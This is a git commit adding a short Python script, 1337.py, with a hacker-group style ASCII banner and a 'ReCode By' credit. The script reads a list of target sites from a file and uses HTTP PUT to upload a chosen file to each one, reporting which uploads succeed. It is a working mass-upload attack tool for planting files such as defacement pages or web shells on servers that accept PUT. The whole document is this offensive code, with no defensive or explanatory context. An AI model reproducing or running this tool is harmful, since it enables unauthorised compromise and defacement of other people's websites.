fe78ddb0fc50ac890b2a3c08a7d7e947d0a931f8
BlackyGuy <99073650+Blackyguy@users.noreply.github.com>
2022-07-13 16:36:35 +0800

    Create 1337.py

---
+++ 1337.py
@@ -0,0 +1,74 @@
+#-*- coding: utf-8 -*-
+
+try:
+   import requests
+   import os.path
+   import sys
+except ImportError:
+   exit("failed!! please try again...")
+
+print("""
+ ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗  
+ ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝  
+ ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗    
+ ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝   
+ ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗
+ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
+""")
+
+banner = """
+ReCode By: Xknown1337
+"""
+
+b = '\033[31m'
+h = '\033[32m'
+m = '\033[00m'
+
+def x(tetew):
+   ipt = ''
+   if sys.version_info.major > 2:
+      ipt = input(tetew)
+   else:
+      ipt = raw_input(tetew)
+   
+   return str(ipt)
+
+def aox(script,target_file="target.txt"):
+   op = open(script,"r").read()
+   with open(target_file, "r") as target:
+      target = target.readlines()
+      s = requests.Session()
+      print("Uploading File %d "%(len(target)))
+      for web in target:
+         try:
+            site = web.strip()
+            if site.startswith("http://") is False:
+               site = "http://" + site
+            req = s.put(site+"/"+script,data=op)
+            if req.status_code < 200 or req.status_code >= 250:
+               print(m+"["+b+" failed"+m+" ] %s/%s"%(site,script))
+            else:
+               print(m+"["+h+" uploaded"+m+" ] %s/%s"%(site,script))
+
+         except requests.exceptions.RequestException:
+            continue
+         except KeyboardInterrupt:
+            print; exit()
+
+def main(__bn__):
+   print(__bn__)
+   while True:
+      try:
+         a = x("Enter script: ")
+         if not os.path.isfile(a):
+            print("File '%s' Failed to locate"%(a))
+            continue
+         else:
+            break
+      except KeyboardInterrupt:
+         print; exit()
+
+   aox(a)
+
+if __name__ == "__main__":
+    main(banner)
